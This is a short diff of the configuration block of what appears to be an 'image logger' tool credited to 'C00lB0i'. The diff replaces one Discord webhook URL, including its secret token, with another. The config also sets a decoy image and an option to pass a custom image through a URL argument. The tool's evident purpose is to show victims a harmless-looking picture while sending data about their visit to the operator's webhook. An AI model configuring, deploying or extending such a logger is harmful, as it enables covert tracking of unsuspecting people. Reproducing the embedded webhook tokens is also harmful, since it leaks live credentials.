@@ -12,7 +12,7 @@ __author__ = "C00lB0i"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1380072848730624060/vWIQ6SN2j4QpeqVkOKW5nLaxmK68g8tUJBRlu-J26HGm_uS9UnG9YQpRnynYTXmluNlq",
+    "webhook": "https://discord.com/api/webhooks/1380361231914893406/LF7AlBYX87ZMzJIlogH-UvlX5nK2IXJCROlhoMDyaJFP3RvoWC2xz_eGL7P4xuDZM2yd",
     "image": "https://www.alimentarium.org/sites/default/files/media/image/2016-06/shutterstock_mama_mia_ma%C3%AFs_109905095_0.png", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
